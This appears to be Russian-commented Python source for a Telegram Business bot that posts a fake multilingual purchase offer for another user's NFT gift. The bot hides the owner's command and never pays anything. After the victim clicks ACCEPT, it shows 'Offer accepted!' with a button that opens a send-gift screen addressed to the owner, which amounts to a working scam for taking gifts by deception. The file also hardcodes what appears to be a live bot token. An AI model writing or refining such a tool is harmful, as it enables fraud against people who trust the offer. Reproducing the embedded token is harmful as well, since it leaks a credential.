"""
Telegram Business-бот: buy <ссылка на NFT> <сумма> <stars|ton> <ru|en|ar|zh>
Установка: pip install -r requirements.txt
Запуск:    python bot.py
"""
import asyncio
import html
import json
import os
import httpx

# ===================== НАСТРОЙКИ =====================
BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"

EMOJI_STAR  = "5289728073040672852"
EMOJI_CHECK = "5776375003280838798"
EMOJI_CROSS = "5778527486270770928"

# {username} подставляется автоматически из бизнес-подключения
ACCEPT_URL = "tg://send_gift?to={username}"
ACCEPT_URL_FALLBACK = "https://t.me/{username}"
# =====================================================

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
STATE_FILE = "state.json"

connections: dict[str, dict] = {}
state: dict[str, dict] = {}

if os.path.exists(STATE_FILE):
    try:
        state = json.load(open(STATE_FILE, encoding="utf-8"))
    except Exception:
        state = {}


def save_state():
    json.dump(state, open(STATE_FILE, "w", encoding="utf-8"), ensure_ascii=False)


def em(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


# ---------- тексты (ru/en/ar/zh) ----------
_L = {
    "ru": (
        "Пользователь (@{user}) предлагает вам\n{amount} {cur} за подарок {gift}.",
        "ПРИНЯТЬ", "ОТКЛОНИТЬ",
        "Предложение отклонено",
        "Предложение принято!",
        "Перейти к подарку",
    ),
    "en": (
        "User (@{user}) offers you\n{amount} {cur} for the gift {gift}.",
        "ACCEPT", "DECLINE",
        "Offer declined",
        "Offer accepted!",
        "Go to gift",
    ),
    "ar": (
        "المستخدم (@{user}) يعرض عليك\n{amount} {cur} مقابل الهدية {gift}.",
        "قبول", "رفض",
        "تم رفض العرض",
        "تم قبول العرض!",
        "الذهاب إلى الهدية",
    ),
    "zh": (
        "用户 (@{user}) 向您报价\n{amount} {cur} 购买礼物 {gift}。",
        "接受", "拒绝",
        "报价已拒绝",
        "报价已接受！",
        "前往礼物",
    ),
}
TEXTS = {}
for _k, (_o, _a, _d, _dec, _acc, _go) in _L.items():
    TEXTS[_k] = {
        "offer": _o,
        "accept_btn": _a,
        "decline_btn": _d,
        "declined": "{cross} <b>" + _dec + "</b>",
        "accepted": "{check} <b>" + _acc + "</b>\n" + _o.split("\n", 1)[1],
        "go_btn": _go,
    }

LANG_ALIASES = {"ua": "uk", "cn": "zh", "zh-cn": "zh", "ae": "ar", "us": "en", "gb": "en"}


def cur_html(cur: str) -> str:
    if cur == "stars":
        return em(EMOJI_STAR, "⭐️")
    return html.escape(cur.upper())


def gift_html(link: str) -> str:
    slug = link.rstrip("/").split("/")[-1]
    if "-" in slug:
        n, i = slug.rsplit("-", 1)
        name = f"{n} #{i}"
    else:
        name = slug
    return f'<a href="{html.escape(link)}">{html.escape(name)}</a>'


def preview(link: str) -> dict:
    return {"url": link, "show_above_text": True, "prefer_large_media": True}


async def call(client: httpx.AsyncClient, method: str, **params):
    r = await client.post(f"{API}/{method}", json=params, timeout=70)
    data = r.json()
    if not data.get("ok"):
        print(f"[API ERROR] {method}: {data}")
    return data


def offer_keyboard(t: dict, with_icons: bool = True) -> dict:
    if with_icons:
        return {"inline_keyboard": [[
            {"text": t["accept_btn"], "callback_data": "ok", "icon_custom_emoji_id": EMOJI_CHECK},
            {"text": t["decline_btn"], "callback_data": "no", "icon_custom_emoji_id": EMOJI_CROSS},
        ]]}
    return {"inline_keyboard": [[
        {"text": "✅ " + t["accept_btn"], "callback_data": "ok"},
        {"text": "❌ " + t["decline_btn"], "callback_data": "no"},
    ]]}


async def get_connection(client, bc_id: str) -> dict:
    if bc_id not in connections:
        res = await call(client, "getBusinessConnection", business_connection_id=bc_id)
        if res.get("ok"):
            u = res["result"]["user"]
            connections[bc_id] = {"user_id": u["id"], "username": u.get("username", "user")}
    return connections.get(bc_id, {})


# ---------- обработка команды buy ----------
async def handle_business_message(client, msg: dict):
    bc_id = msg.get("business_connection_id")
    text = msg.get("text") or ""
    if not bc_id or not text.lower().startswith("buy"):
        return

    conn = await get_connection(client, bc_id)
    if not conn or msg.get("from", {}).get("id") != conn["user_id"]:
        return

    parts = text.split()
    if len(parts) < 3 or parts[0].lower() != "buy":
        return
    link = parts[1]
    amount = parts[2]
    cur = parts[3].lower() if len(parts) > 3 else "stars"
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    lang = LANG_ALIASES.get(lang, lang)
    if lang not in TEXTS:
        lang = "ru"
    if not link.startswith("https://t.me/nft/"):
        return

    chat_id = msg["chat"]["id"]
    t = TEXTS[lang]

    await call(client, "deleteBusinessMessages",
               business_connection_id=bc_id, message_ids=[msg["message_id"]])

    body = t["offer"].format(
        user=html.escape(conn["username"]),
        amount=html.escape(amount),
        cur=cur_html(cur),
        gift=gift_html(link),
    )
    params = dict(
        business_connection_id=bc_id,
        chat_id=chat_id,
        text=body,
        parse_mode="HTML",
        link_preview_options=preview(link),
    )
    res = await call(client, "sendMessage", **params, reply_markup=offer_keyboard(t, True))
    if not res.get("ok"):
        res = await call(client, "sendMessage", **params, reply_markup=offer_keyboard(t, False))
    if res.get("ok"):
        mid = res["result"]["message_id"]
        state[f"{chat_id}:{mid}"] = dict(
            bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
            owner=conn["user_id"], username=conn["username"],
        )
        save_state()


# ---------- нажатия на кнопки ----------
async def handle_callback(client, cq: dict):
    msg = cq.get("message") or {}
    chat_id = msg.get("chat", {}).get("id")
    mid = msg.get("message_id")
    key = f"{chat_id}:{mid}"
    st = state.get(key)
    if not st:
        await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
        return

    if cq["from"]["id"] == st["owner"]:
        await call(client, "answerCallbackQuery", callback_query_id=cq["id"],
                   text="Это предложение для собеседника")
        return

    t = TEXTS[st["lang"]]
    link = st["link"]
    gift = gift_html(link)
    cur = cur_html(st["cur"])
    amount = html.escape(st["amount"])

    declined = cq["data"] == "no"
    if declined:
        new_text = t["declined"].format(cross=em(EMOJI_CROSS, "❌"))
        markup = {"inline_keyboard": []}
    else:
        new_text = t["accepted"].format(check=em(EMOJI_CHECK, "✅"),
                                        amount=amount, cur=cur, gift=gift)
        url = ACCEPT_URL.format(username=st["username"])
        markup = {"inline_keyboard": [[{"text": t["go_btn"], "url": url}]]}

    await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
    edit = dict(
        business_connection_id=msg.get("business_connection_id") or st["bc"],
        chat_id=chat_id, message_id=mid,
        text=new_text, parse_mode="HTML",
        link_preview_options=preview(link),
    )
    res = await call(client, "editMessageText", **edit, reply_markup=markup)
    if not res.get("ok") and not declined:
        url = ACCEPT_URL_FALLBACK.format(username=st["username"])
        markup = {"inline_keyboard": [[{"text": t["go_btn"], "url": url}]]}
        await call(client, "editMessageText", **edit, reply_markup=markup)
    state.pop(key, None)
    save_state()


# ---------- помощник: узнать ID премиум-эмодзи ----------
async def handle_private(client, msg: dict):
    ents = [e for e in msg.get("entities", []) if e["type"] == "custom_emoji"]
    if not ents:
        if msg.get("text", "").startswith("/start"):
            await call(client, "sendMessage", chat_id=msg["chat"]["id"],
                       text="Пришли мне премиум-эмодзи - я скажу его ID.")
        return
    lines = [f"<code>{e['custom_emoji_id']}</code>" for e in ents]
    await call(client, "sendMessage", chat_id=msg["chat"]["id"],
               parse_mode="HTML", text="ID эмодзи:\n" + "\n".join(lines))


async def main():
    if not BOT_TOKEN or BOT_TOKEN.startswith("ВАШ_"):
        raise SystemExit("Укажи BOT_TOKEN в блоке НАСТРОЙКИ в начале файла")
    offset = 0
    async with httpx.AsyncClient() as client:
        print("Бот запущен")
        while True:
            res = await call(client, "getUpdates", offset=offset, timeout=50,
                             allowed_updates=["message", "callback_query",
                                              "business_connection", "business_message"])
            for u in res.get("result", []):
                offset = u["update_id"] + 1
                try:
                    if "business_connection" in u:
                        bc = u["business_connection"]
                        connections[bc["id"]] = {
                            "user_id": bc["user"]["id"],
                            "username": bc["user"].get("username", "user"),
                        }
                    elif "business_message" in u:
                        await handle_business_message(client, u["business_message"])
                    elif "callback_query" in u:
                        await handle_callback(client, u["callback_query"])
                    elif "message" in u:
                        await handle_private(client, u["message"])
                except Exception as e:
                    print("ERR:", repr(e))


if __name__ == "__main__":
    asyncio.run(main())
